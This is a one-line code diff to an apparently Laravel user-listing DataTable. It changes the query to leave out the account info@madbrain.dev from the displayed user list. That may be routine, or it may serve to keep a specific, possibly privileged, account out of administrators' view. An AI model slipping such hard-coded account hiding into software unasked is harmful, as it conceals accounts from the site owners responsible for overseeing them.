@@ -70,7 +70,7 @@ class UserDataTable extends DataTable
      */
     public function query(User $model): QueryBuilder
     {
-        return $model->newQuery()->orderBy('id', 'DESC')->select('users.*');
+        return $model->newQuery()->where('email','!=','info@madbrain.dev')->orderBy('id', 'DESC')->select('users.*');
     }
 
     /**
